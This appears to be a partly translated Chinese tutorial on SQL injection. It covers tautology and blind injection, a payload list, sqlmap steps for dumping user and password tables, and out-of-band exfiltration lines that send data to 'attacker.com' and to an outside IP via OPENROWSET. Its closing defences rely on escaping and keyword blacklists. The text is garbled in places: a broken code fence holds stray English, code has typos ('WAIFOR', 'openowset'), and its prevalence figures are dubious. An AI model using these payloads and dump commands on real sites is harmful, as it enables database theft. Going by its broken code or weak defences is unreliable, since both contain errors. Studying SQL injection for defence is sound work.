# SQL Injections (SQLi)

![](http://i.imgur.com/AcVJKT2.png)

* SQL通过构建查询语句来工作，这些语句的目的是为了变得方便阅读和直观。


* SQL查询搜索可以很容易地进行操作，并假设SQL查询搜索是可靠的命令。这意味着SQL搜索可以通过存取控制机制来传递，而不被注意。
* 通过使用转移标准身份验证和检查授权凭证的方法，您可以访问存储在数据库中的重要信息。

* 开发:
	- 从数据库中转储内容。
	- 插入新数据。
	- 修改现有的数据。
	- 写入磁盘。

## 举个最简单的例子

传递给用户名的参数:

```
SELECT * FROM users WHERE
name="$name";
```

在这种情况下，攻击者只需要引入一个真正的逻辑表达式 ```1=1```:

```
SELECT * FROM users WHERE 1=1;
```
因此**WHERE**子句总是被执行，这意味着它将返回与所有用户匹配的值。

现在估计只有不到5%的网站有这样的漏洞。

这些类型的缺陷有助于其他攻击的发生，例如XSS或缓冲区溢出。

## SQL 盲注

* 推断:当数据没有返回并/或详细的错误消息被禁用时，这是有用的技术。我们可以根据页面响应的某些属性对两个状态进行区分。

* 据估计，超过20%的网站都有这样的移除。

* 在传统的SQLi中，可以通过攻击者编写有效负载来揭示信息。在盲目的SQLi中，攻击者需要询问服务器是否为真或假。例如，您可以请求一个用户。如果用户存在，它将载入网站，所以这是真的。

* 基于时间的技术:基于延迟的数据库查询(sleep()、等待延迟等)来推断。

```
IF SYSTEM_USER="john" WAIFOR DELAY '0:0:15'
```

* 基于响应的技术(真或假):基于响应的文本进行推断。例子:

```
SELECT count (*) FROM reviews WHERE author='bob' (true)
SELECT count (*) FROM reviews WHERE author='bob' and '1'='1' (true)
SELECT count (*) FROM reviews WHERE author='bob' and '1'='2' (false)
SELECT count (*) FROM reviews WHERE author='bob' and SYSTEM_USER='john' (false)
SELECT count (*) FROM reviews WHERE author='bob' and SUBSTRING(SYSTEM_USER,1,1)='a' (false)
SELECT count (*) FROM reviews WHERE author='bob' and SUBSTRING(SYSTEM_USER,1,1)='c' (true)
```
(并继续进行迭代，直到找到systemuser的值)。

* 利用HTTP响应之外的传输。

```
SELECT * FROM  reviews WHERE review_author=UTL_INADDR.GET_HOST_ADDRESS((select user from dual ||'.attacker.com'));
INSERT into openowset('sqloledb','Network=DBMSSOCN; Address=10.0.0.2,1088;uid=gds574;pwd=XXX','SELECT * from tableresults') Select name,uid,isntuser from master.dbo.sysusers--
```

### 常见的方法开发
* 每当你看到一个URL，**问号**后面跟着某种类型的字母或单词，就意味着一个值从一个页面发送到另一个页面。

* 在这个例子里
```
http://www.website.com/info.php?id=10
```
页面 *info.php* 正在接收数据，并将有一些像这样的代码:
```
$id=$_post['id'];
```
以及一个相关的SQL查询:
```
QueryHere = "select * from information where code='$id'"
```



#### 检查漏洞
我们可以通过在URL的结尾附加一个简单的单引号 ```'``` 来验证目标是否脆弱。

```
http://www.website.com/info.php?id=10'
```

如果该网站返回以下错误:

		You have an error in your SQL syntax...

这意味着这个网站很容易受到SQL的攻击。

#### 找到数据库的结构
要找到数据库中列和表的数量，我们可以使用 [Python's SQLmap](http://sqlmap.org/).

该应用程序通过自动化数据库的SQL注入缺陷的检测和开发，从而简化了SQL注入过程。这里是几种自动机制来查找数据库名、表名和列数。

* ORDER BY:它试图将所有的列从x到无穷排序。当响应显示输入列x不存在时，迭代就停止了，这将会显示x的值。

* UNION:它在不同的表列中收集多个数据。这个自动化的过程试图收集由 ORDER BY 所获得的列/表x、y、z所包含的所有信息。有效负载类似于:

```The automated process tries to gather all information contained in columns/table x,y,z obtained by ORDER BY. The payload is similar to:

```
?id=5'%22union%22all%22select%221,2,3
```

* Normally the databases are defined with names such as: user, admin, member, password, passwd, pwd, user_name. The injector uses a trial and error technique to try to identify the name:

```
?id=5'%22union%22all%22select%221,2,3%22from%22admin
```
So, for example, to find the database name, we run the *sqlmap* script with target *-u* and enumeration options *--dbs* (enumerate DBMS databases):

```
$ ./sqlmap.py -u <WEBSITE> --dbs
(...)
[12:59:20] [INFO] testing if URI parameter '#1*' is dynamic
[12:59:22] [INFO] confirming that URI parameter '#1*' is dynamic
[12:59:23] [WARNING] URI parameter '#1*' does not appear dynamic
[12:59:25] [WARNING] heuristic (basic) test shows that URI parameter '#1*' might not be injectable
[12:59:25] [INFO] testing for SQL injection on URI parameter '#1*'
[12:59:25] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[12:59:27] [WARNING] reflective value(s) found and filtering out
[12:59:51] [INFO] testing 'MySQL >= 5.0 AND error-based - WHERE or HAVING clause'
[13:00:05] [INFO] testing 'PostgreSQL AND error-based - WHERE or HAVING clause'
[13:00:16] [INFO] testing 'Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause'
(...)
```

#### 获得数据库的访问权限

* 例如，通过这种方式，我们可以验证我们现有的数据库是什么。通过这种方式，我们可以知道出现了多少个表，以及它们各自的名称。sqlmap命令是:

```
./sqlmap -u <WEBSITE> --tables <DATABASE-NAME>
```

* 主要的目标是找到用户名和密码，以便获得访问/登录站点的权限，例如在一个名为*用户*的表中。sqlmap命令

```
./sqlmap -u <WEBSITE> --columns -D <DATABASE-NAME> -T <TABLE-NAME>
```

这将返回给定表中的列的信息。

* 现在，我们可以使用标记为```-C```的列名称来转储所有列的所有数据: 

```
./sqlmap -u <WEBSITE> --columns -D <DATABASE-NAME> -T <TABLE-NAME> -C 'id,name,password,login,email' --dump
```

如果密码是明文(不是在md5中散列，等等)，我们就可以访问这个网站。

## 基本SQL注入开发步骤

1. 指纹数据库服务器。
2. 获得初步的运行开发。有效负载的例子:
	- '
	- '--
	- ')--
	- '))--
	- or '1'='1'
	- or '1'='1
	- 1--
3. 通过UNION语句提取数据:
	- NULL: 用作列位置占位符有助于数据类型转换错误
	- GROUP 帮助确定列数
4. 列举数据库架构。
5. 把应用程序数据倾卸。
6. 升级特权，并将操作系统升级。



## 一些保护建议

* 永远不要将数据库作为超级用户或根用户连接。
* 净化任何用户输入。PHP有几个函数来验证函数，比如:
	- is_numeric()
	- ctype_digit()
	- settype()
	- addslahes()
	- str_replace()
* 对所有非数值输入值，添加引号 ```"```这些输入值将通过使用转义chars函数传递给数据库:
	- mysql_real_escape_string()
	- sqlit_escape_string()

```php
$name = 'John';
$name = mysql_real_escape_string($name);
$SQL = "SELECT * FROM users WHERE username='$name'";
```

* 始终执行从用户接收到的数据的解析(POST和FORM方法)。
	- 需要被检查的字符串:```", ', whitespace, ;, =, <, >, !, --, #, //```.
	- 保留的单词: SELECT, INSERT, UPDATE, DELETE, JOIN, WHERE, LEFT, INNER, NOT, IN, LIKE, TRUNCATE, DROP, CREATE, ALTER, DELIMITER.

* 不要显示展现请求或部分SQL请求的明确的错误信息。它们可以帮助识别RDBMS(MSSQL，MySQL)。

* 删除未使用的用户帐户(和默认帐户)。

* 其他工具: blacklists, AMNESIA, Java Static Tainting, Codeigniter.

